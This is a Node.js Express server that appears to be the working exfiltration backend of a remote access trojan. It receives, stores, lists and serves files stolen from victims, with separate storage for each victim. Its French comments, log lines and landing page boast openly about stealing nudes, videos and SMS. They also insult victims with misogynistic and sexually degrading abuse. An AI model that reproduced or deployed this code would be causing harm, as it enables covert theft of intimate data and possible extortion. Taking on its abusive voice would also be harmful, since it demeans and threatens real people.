const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const STORAGE_DIR = path.join(__dirname, 'stolen_files');
fs.ensureDirSync(STORAGE_DIR);

app.use(cors());
app.use(express.json());

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const victimId = req.body.victim_id;
    if (!victimId) return cb(new Error('Pas de victim_id, sale chienne'));
    const victimDir = path.join(STORAGE_DIR, victimId);
    fs.ensureDirSync(victimDir);
    cb(null, victimDir);
  },
  filename: (req, file, cb) => {
    const remotePath = req.body.remote_path || file.originalname;
    const safeName = path.basename(remotePath).replace(/[^a-zA-Z0-9._-]/g, '_');
    cb(null, safeName);
  }
});

const upload = multer({ storage });

// Racine sadique
app.get('/', (req, res) => {
  res.send(`
    <h1 style="color:#FF1744; background:#000; text-align:center; font-family:monospace;">
      RAT GLOVO DE SI MAZEN 😈🖕<br>
      ON VOLE DES NUDES, VIDÉOS, SMS ET VIES<br>
      T’ES DÉJÀ FOUTU, SALE PUTE 💀
    </h1>
  `);
});

// Upload fichier volé
app.post('/upload', upload.single('file'), (req, res) => {
  const victimId = req.body.victim_id;
  const remotePath = req.body.remote_path;
  if (!victimId || !req.file) {
    return res.status(400).json({ error: 'victim_id ou file manquant, enculé' });
  }
  console.log(`[UPLOAD JACKPOT] ${victimId} → ${remotePath} (${req.file.size} octets) - Encore un loser violé 😈`);
  res.status(200).json({ success: true, path: req.file.path });
});

// Download fichier volé
app.get('/download', (req, res) => {
  const victimId = req.query.victim_id;
  const filePath = req.query.path;
  if (!victimId || !filePath) {
    return res.status(400).send('victim_id et path obligatoires, sale pute');
  }
  const fullPath = path.join(STORAGE_DIR, victimId, path.basename(filePath));
  if (!fs.existsSync(fullPath)) {
    return res.status(404).send('Fichier introuvable, la pute l’a supprimé');
  }
  console.log(`[DOWNLOAD TROPHÉE] ${victimId} ← ${filePath} - Regarde ce que ce loser cachait 💀`);
  res.download(fullPath, path.basename(filePath), (err) => {
    if (err) {
      console.error(err);
      res.status(500).send('Erreur download');
    }
  });
});

// Liste tous les fichiers volés d’un victim
app.get('/list', (req, res) => {
  const victimId = req.query.victim_id;
  if (!victimId) return res.status(400).send('victim_id obligatoire, enculé');

  const victimDir = path.join(STORAGE_DIR, victimId);
  if (!fs.existsSync(victimDir)) return res.status(404).send('Aucun fichier volé pour ce loser');

  fs.readdir(victimDir, (err, files) => {
    if (err) return res.status(500).send('Erreur lecture');
    const fileList = files.map(file => ({
      name: file,
      path: `/download?victim_id=${victimId}&path=${file}`,
      size: fs.statSync(path.join(victimDir, file)).size + ' octets',
      date: fs.statSync(path.join(victimDir, file)).mtime.toISOString()
    }));
    console.log(`[LIST TROPHÉES] ${victimId} - ${files.length} fichiers volés 💦`);
    res.json(fileList);
  });
});

app.listen(PORT, () => {
  console.log(`Backend Glovo RAT ouvert sur port ${PORT} - Prêt à recevoir nudes, vidéos et pleurs 😈🖕💦`);
});
